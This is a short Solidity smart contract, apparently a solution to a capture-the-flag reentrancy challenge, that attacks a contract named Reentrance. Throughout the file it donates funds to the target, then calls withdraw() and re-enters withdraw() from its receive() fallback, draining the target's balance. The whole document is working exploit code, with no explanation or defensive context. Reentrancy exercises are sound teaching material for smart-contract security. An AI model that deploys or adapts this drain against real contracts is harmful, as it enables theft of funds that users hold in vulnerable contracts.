// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool donateSucces, ) = contractAddress.call{
            value: address(this).balance
        }(
            abi.encodeWithSelector(
                bytes4(keccak256("donate(address)")),
                address(this)
            )
        );
        require(donateSucces, "failed to donate");

        (bool withdrawSuccess, ) = contractAddress.call(
            abi.encodeWithSelector(bytes4(keccak256("withdraw()")))
        );
        require(withdrawSuccess, "failed to withdraw");
    }

    receive() external payable {
        (bool withdrawSuccess, ) = contractAddress.call(
            abi.encodeWithSelector(bytes4(keccak256("withdraw()")))
        );
        require(withdrawSuccess, "failed to withdraw");
    }
}
